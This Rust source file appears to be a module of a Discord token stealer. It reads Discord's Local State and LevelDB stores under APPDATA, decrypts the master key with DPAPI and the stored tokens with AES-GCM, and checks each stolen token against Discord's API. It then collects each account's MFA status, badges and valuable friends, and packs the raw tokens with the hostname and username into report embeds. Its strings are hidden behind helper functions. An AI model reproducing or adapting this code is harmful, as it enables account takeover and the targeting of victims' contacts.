use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
use base64::{engine::general_purpose, Engine as _};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{collections::{HashMap, HashSet}, env, fs, path::PathBuf};
use regex::Regex;

use crate::core::api;
use crate::encrypted::*;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct DiscordAccount {
    pub username: String,
    pub id: String,
    pub token: String,
    pub public_flags: u64,
    pub mfa_enabled: bool,
}

#[derive(Debug, Clone, serde::Serialize)]
pub struct DiscordFriend {
    pub username: String,
    pub id: String,
    pub public_flags: u64,
    pub relationship_type: i32,
}

pub fn get_discord_paths() -> HashMap<String, PathBuf> {
    let roaming = PathBuf::from(env::var(s_appdata()).unwrap_or_default());
    let mut paths = HashMap::new();
    paths.insert(s_discord(), roaming.join(s_discord_l()));
    paths.insert(s_discord_ptb(), roaming.join(s_discord_ptb_l()));
    paths.insert(s_discord_canary(), roaming.join(s_discord_canary_l()));
    paths
}

fn decrypt_master_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
    let dpapi_prefix = s_dpapi_prefix();
    let key_data = if encrypted_key.starts_with(dpapi_prefix.as_bytes()) {
        &encrypted_key[5..]
    } else {
        encrypted_key
    };
    api::dpapi_decrypt(key_data, 0)
}

fn decrypt_token(raw_data: &[u8], master_key: &[u8]) -> Option<String> {
    if raw_data.len() < 15 {
        return None;
    }
    let prefix = &raw_data[0..3];
    let (iv, ciphertext) = match prefix {
        b"v10" | b"v11" | b"v20" => {
            if raw_data.len() < 15 {
                return None;
            }
            (&raw_data[3..15], &raw_data[15..])
        }
        _ => {
            if raw_data.len() < 12 {
                return None;
            }
            (&raw_data[0..12], &raw_data[12..])
        }
    };
    if ciphertext.len() < 16 {
        return None;
    }
    let (encrypted_data, tag) = ciphertext.split_at(ciphertext.len() - 16);
    let mut payload = encrypted_data.to_vec();
    payload.extend_from_slice(tag);

    let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(master_key));
    let nonce = Nonce::from_slice(iv);
    cipher
        .decrypt(nonce, payload.as_ref())
        .ok()
        .and_then(|d| String::from_utf8(d).ok())
}

pub fn badge_emojis(flags: u64) -> Vec<String> {
    let badges: [(u64, fn() -> String); 12] = [
        (1 << 0, s_badge_staff),
        (1 << 1, s_badge_partner),
        (1 << 2, s_badge_hypesquad),
        (1 << 3, s_badge_bughunter1),
        (1 << 9, s_badge_early),
        (1 << 12, s_badge_nitro_classic),
        (1 << 13, s_badge_nitro),
        (1 << 14, s_badge_bughunter2),
        (1 << 16, s_badge_developer),
        (1 << 17, s_badge_dev),
        (1 << 18, s_badge_moderator),
        (1 << 22, s_badge_active_dev),
    ];
    let mut emojis = Vec::new();
    for (bit, emoji_fn) in &badges {
        if flags & bit != 0 {
            emojis.push(emoji_fn());
        }
    }
    emojis
}

pub async fn fetch_discord_user(client: &reqwest::Client, token: &str) -> Option<DiscordAccount> {
    let url = crate::s_api_url();
    let auth_header = s_auth_header();
    let res = client
        .get(&url)
        .header(&auth_header, token)
        .send()
        .await
        .ok()?;
    if res.status().is_success() {
        let body = res.text().await.ok()?;
        let json: Value = serde_json::from_str(&body).ok()?;
        let username = json[s_username_field()].as_str()?.to_string();
        let id = json[s_id_field()].as_str()?.to_string();
        let public_flags = json[s_public_flags()].as_u64().unwrap_or(0);
        let mfa_enabled = json[s_mfa_enabled()].as_bool().unwrap_or(false);
        Some(DiscordAccount { username, id, token: token.to_string(), public_flags, mfa_enabled })
    } else {
        None
    }
}

pub async fn fetch_discord_friends(client: &reqwest::Client, token: &str) -> Vec<DiscordFriend> {
    let url = format!("{}/{}", crate::s_api_url(), s_discord_relationships());
    let res = match client
        .get(&url)
        .header(s_auth_header(), token)
        .header(s_discord_ua_header(), s_discord_ua())
        .send()
        .await
    {
        Ok(r) => r,
        Err(_) => return Vec::new(),
    };
    let body = match res.text().await {
        Ok(t) => t,
        Err(_) => return Vec::new(),
    };
    let json: Value = match serde_json::from_str(&body) {
        Ok(j) => j,
        Err(_) => return Vec::new(),
    };
    let arr = match json.as_array() {
        Some(a) => a,
        None => return Vec::new(),
    };
    let mut friends = Vec::new();
    for entry in arr {
        let rel_type = entry[s_discord_field_type()].as_i64().unwrap_or(0) as i32;
        if rel_type != 1 {
            continue;
        }
        let user = &entry[s_discord_field_user()];
        let username = user[s_discord_field_username()].as_str().unwrap_or("?").to_string();
        let id = user[s_discord_field_id()].as_str().unwrap_or("?").to_string();
        let public_flags = user[s_discord_field_public_flags()].as_u64().unwrap_or(0);
        friends.push(DiscordFriend {
            username,
            id,
            public_flags,
            relationship_type: rel_type,
        });
    }
    friends
}

pub async fn get_discord_data(client: &reqwest::Client) -> (Vec<DiscordAccount>, String, Vec<Value>) {
    let discord_paths = get_discord_paths();
    let mut discord_accounts: Vec<DiscordAccount> = Vec::new();
    let mut sent_tokens = HashSet::new();

    for (_name, path) in discord_paths {
        if !path.exists() {
            continue;
        }

        let local_state_name = s_local_state();
        let local_state_path = path.join(&local_state_name);
        let content = match fs::read_to_string(&local_state_path) {
            Ok(c) => c,
            Err(_) => continue,
        };
        let json_ls: Value = match serde_json::from_str(&content) {
            Ok(v) => v,
            Err(_) => continue,
        };
        let osc = s_os_crypt();
        let ek = s_encrypted_key();
        let enc_key_str = match json_ls[&osc][&ek].as_str() {
            Some(s) => s,
            None => continue,
        };
        let bytes = match general_purpose::STANDARD.decode(enc_key_str) {
            Ok(b) => b,
            Err(_) => continue,
        };
        let master_key = match decrypt_master_key(&bytes[5..]) {
            Some(k) => k,
            None => continue,
        };
        let prof_path = path.clone();
        if !prof_path.exists() {
            continue;
        }
        let db_path = prof_path.join(s_leveldb());
        if !db_path.exists() {
            continue;
        }
        let entries = match fs::read_dir(&db_path) {
            Ok(e) => e,
            Err(_) => continue,
        };
        let marker = s_token_marker();
        let re_pattern = format!(r#"{}[^"]+"#, &marker);
        let re = match Regex::new(&re_pattern) {
            Ok(r) => r,
            Err(_) => continue,
        };
        let mut entry_count = 0u32;
        for entry in entries.flatten() {
            entry_count += 1;
            if let Ok(file_content) = fs::read(entry.path()) {
                let text = String::from_utf8_lossy(&file_content);
                for cap in re.captures_iter(&text) {
                    let b64_part = cap[0]
                        .split(&marker)
                        .nth(1)
                        .unwrap_or_default()
                        .trim_end_matches('"')
                        .trim_end_matches('\\');
                    if let Ok(enc_data) = general_purpose::STANDARD.decode(b64_part) {
                        if let Some(token) = decrypt_token(&enc_data, &master_key) {
                            if sent_tokens.insert(token.clone()) {
                                if let Some(account) = fetch_discord_user(client, &token).await {
                                    discord_accounts.push(account);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    let hostname = crate::get_hostname();
    let username = crate::get_username();
    let mut discord_content = String::new();
    let mut embeds: Vec<Value> = Vec::new();

    let mut summary_description = format!("{}{}", discord_accounts.len(), s_discord_accounts_found());

    for acc in &discord_accounts {
        let acc_badges = badge_emojis(acc.public_flags);
        let acc_badges_str = if acc_badges.is_empty() { "None" } else { &acc_badges.join(" ") };
        let mfa_str = if acc.mfa_enabled { "enabled" } else { "disabled" };
        {
            let fmt = s_discord_report_fmt();
            let entry = fmt
                .replacen("{}", &acc.username, 1)
                .replacen("{}", &acc.id, 1)
                .replacen("{}", &acc.token, 1)
                .replacen("{}", acc_badges_str, 1)
                .replacen("{}", mfa_str, 1)
                .replacen("{}", &"-".repeat(30), 1);
            discord_content.push_str(&entry);
        }
        summary_description.push_str(&format!("`{}` - {} - MFA: {}\n", acc.username, acc_badges_str, mfa_str));

        let friends = fetch_discord_friends(client, &acc.token).await;
        if !friends.is_empty() {
            let hq_friends: Vec<&DiscordFriend> = friends.iter().filter(|f| !badge_emojis(f.public_flags).is_empty()).collect();
            if !hq_friends.is_empty() {
                discord_content.push_str(&format!("\n--- HQ Friends of {} ({}/{} total) ---\n", acc.username, hq_friends.len(), friends.len()));
                summary_description.push_str(&format!("\n**HQ Friends of `{}`** ({}/{}):\n", acc.username, hq_friends.len(), friends.len()));
                let mut hq_lines: Vec<String> = Vec::new();
                for f in &hq_friends {
                    let f_badges = badge_emojis(f.public_flags);
                    let f_badges_str = f_badges.join(" ");
                    discord_content.push_str(&format!("  {} | ID: {} | Badges: {}\n", f.username, f.id, f_badges_str));
                    summary_description.push_str(&format!("  `{}` {}\n", f.username, f_badges_str));
                    hq_lines.push(format!("{} - `{}`", f_badges_str, f.username));
                }
                let acc_badge_str = if acc_badges.is_empty() {
                    String::new()
                } else {
                    format!(" {}", acc_badges.join(" "))
                };
                embeds.push(json!({
                    "title": format!("HQ FRIENDS - {}{}", acc.username, acc_badge_str),
                    "description": hq_lines.join("\n"),
                    "color": 0x2F3136,
                    "footer": { "text": format!("{} friends with badges out of {}", hq_lines.len(), friends.len()) },
                    "timestamp": chrono::Utc::now().to_rfc3339()
                }));
            }
        }
    }

    embeds.insert(0, json!({
        "title": format!("{}", username),
        "description": summary_description,
        "color": 0x7289DA,
        "footer": { "text": format!("{} | {}", hostname, username) },
        "timestamp": chrono::Utc::now().to_rfc3339()
    }));

    (discord_accounts, discord_content, embeds)
}
